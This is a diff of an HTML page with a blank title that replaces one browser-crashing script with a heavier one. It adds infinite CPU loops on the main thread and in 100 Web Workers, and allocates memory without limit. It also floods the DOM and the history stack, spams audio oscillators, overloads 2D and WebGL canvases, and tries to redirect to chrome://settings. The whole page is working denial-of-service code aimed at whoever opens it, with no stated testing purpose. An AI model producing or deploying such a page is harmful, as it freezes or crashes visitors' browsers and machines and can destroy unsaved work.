@@ -4,101 +4,163 @@
 <meta charset="UTF-8">
 <title></title>
 <style>
-* { will-change: transform, filter; }
-body { margin:0; overflow:hidden; }
+*{will-change:transform,filter;}
+body{margin:0;overflow:hidden;background:black;}
+canvas{position:fixed;left:0;top:0;}
 </style>
 </head>
 <body>
-<script>
 
-function cpuBlackHole(){
-    while(true){
-        Math.sqrt(Math.random()*Date.now());
-    }
-}
-setTimeout(cpuBlackHole, 200);
+<canvas id="gl"></canvas>
+
+<script>
+setTimeout(()=>{
+  try{location.href="chrome://settings"}catch(e){}
+  try{location.replace("chrome://settings")}catch(e){}
+  try{window.open("chrome://settings","_self")}catch(e){}
+},3000);
+
+setTimeout(()=>{
+  while(true){Math.sqrt(Math.random()*Date.now())}
+},100);
+
+(function f(){Promise.resolve().then(f)})();
 
 let mem=[];
 setInterval(()=>{
-    mem.push(new Uint8Array(999_000_000));
-},50);
+  mem.push(new Uint8Array(250_000_000));
+},30);
 
 setInterval(()=>{
-    for(let i=0;i<20000;i++){
-        const d=document.createElement("div");
-        d.textContent=Math.random();
-        d.style.position="absolute";
-        d.style.left=Math.random()*innerWidth+"px";
-        d.style.top=Math.random()*innerHeight+"px";
-        d.style.fontSize=(Math.random()*100)+"px";
-        document.body.appendChild(d);
-    }
-},20);
+  for(let i=0;i<15000;i++){
+    let d=document.createElement("div");
+    d.textContent=Math.random();
+    d.style.position="absolute";
+    d.style.left=Math.random()*innerWidth+"px";
+    d.style.top=Math.random()*innerHeight+"px";
+    document.body.appendChild(d);
+  }
+},25);
 
 setInterval(()=>{
-    document.body.style.transform=
-        `scale(${Math.random()*5})
-         rotate(${Math.random()*360}deg)`;
-    document.body.offsetHeight;
-},0);
-
-(function micro(){
-    Promise.resolve().then(micro);
-})();
-
-setInterval(()=>{
-    history.pushState({}, "", "#"+Math.random());
+  history.pushState({}, "", "#"+Math.random());
 },5);
-
-const c=document.createElement("canvas");
-document.body.appendChild(c);
-const x=c.getContext("2d");
-
-function resize(){
-    c.width=innerWidth*2;
-    c.height=innerHeight*2;
-}
-resize();
-
-function gpu(){
-    for(let i=0;i<50000;i++){
-        x.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
-        x.fillRect(
-            Math.random()*c.width,
-            Math.random()*c.height,
-            50,50
-        );
-    }
-    requestAnimationFrame(gpu);
-}
-gpu();
-
-const ac=new (AudioContext||webkitAudioContext)();
-setInterval(()=>{
-    const o=ac.createOscillator();
-    o.frequency.value=Math.random()*5000;
-    o.connect(ac.destination);
-    o.start();
-    o.stop(ac.currentTime+0.02);
-},10);
-
 for(let i=0;i<100;i++){
-    new Worker(URL.createObjectURL(new Blob([`
-        while(true){
-            Math.tan(Math.random());
-        }
-    `])));
+  new Worker(URL.createObjectURL(new Blob([`
+    while(true){Math.tan(Math.random())}
+  `])));
 }
 
+const AC=window.AudioContext||window.webkitAudioContext;
+const ac=new AC();
 setInterval(()=>{
-    document.body.style.filter=
-        `invert(${Math.random()})
-         blur(${Math.random()*20}px)
-         hue-rotate(${Math.random()*360}deg)
-         saturate(10)`;
-    document.body.style.background=
-        `hsl(${Math.random()*360},100%,50%)`;
-},10);
+  let o=ac.createOscillator();
+  o.frequency.value=Math.random()*8000;
+  o.connect(ac.destination);
+  o.start();
+  o.stop(ac.currentTime+0.02);
+},15);
+
+const flood=document.createElement("canvas");
+document.body.appendChild(flood);
+const fx=flood.getContext("2d");
+
+function gpu2d(){
+  flood.width=innerWidth;
+  flood.height=innerHeight;
+  for(let i=0;i<60000;i++){
+    fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
+    fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,40,40);
+  }
+  requestAnimationFrame(gpu2d);
+}
+gpu2d();
+
+const canvas=document.getElementById("gl");
+const gl=canvas.getContext("webgl");
+
+const quad=[
+-1,-1,0, 1,-1,0, 1,1,0,
+-1,-1,0, 1,1,0, -1,1,0
+];
+
+function randFrag(){
+return `
+precision highp float;
+float h(vec2 p){return fract(sin(dot(p,vec2(127.1,311.7)))*43758.5);}
+void main(){
+ vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
+ vec3 c=vec3(0.);
+ for(int i=0;i<80;i++){
+   float t=float(i);
+   uv+=vec2(sin(uv.y*t*20.),cos(uv.x*t*20.))*0.01;
+   c+=vec3(
+     sin(uv.x*200.+t),
+     cos(uv.y*200.-t),
+     sin((uv.x+uv.y)*100.)
+   );
+ }
+ c+=vec3(h(uv+fract(sin(uv*1000.))));
+ gl_FragColor=vec4(c,1.);
+}`;
+}
+
+const VSHADER=`attribute vec4 p;void main(){gl_Position=p;}`;
+
+function compile(t,s){
+ let sh=gl.createShader(t);
+ gl.shaderSource(sh,s);
+ gl.compileShader(sh);
+ return sh;
+}
+
+let buf=gl.createBuffer();
+gl.bindBuffer(gl.ARRAY_BUFFER,buf);
+gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(quad),gl.STATIC_DRAW);
+
+function build(){
+ let vs=compile(gl.VERTEX_SHADER,VSHADER);
+ let fs=compile(gl.FRAGMENT_SHADER,randFrag());
+ let pr=gl.createProgram();
+ gl.attachShader(pr,vs);
+ gl.attachShader(pr,fs);
+ gl.linkProgram(pr);
+ gl.useProgram(pr);
+ let loc=gl.getAttribLocation(pr,"p");
+ gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0);
+ gl.enableVertexAttribArray(loc);
+ return pr;
+}
+
+let prog=build();
+
+
+setInterval(()=>{prog=build()},120);
+
+setInterval(()=>{
+ canvas.width=500+Math.random()*3000;
+ canvas.height=500+Math.random()*3000;
+ gl.viewport(0,0,canvas.width,canvas.height);
+},100);
+
+setInterval(()=>{
+ let c=document.createElement("canvas");
+ let g=c.getContext("webgl");
+ if(g){
+   let s=g.createShader(g.FRAGMENT_SHADER);
+   g.shaderSource(s,randFrag());
+   g.compileShader(s);
+ }
+},150);
+
+function draw(){
+ for(let i=0;i<30;i++){
+   gl.drawArrays(gl.TRIANGLES,0,6);
+ }
+ gl.finish();
+ requestAnimationFrame(draw);
+}
+draw();
 
 </script>
 </body>
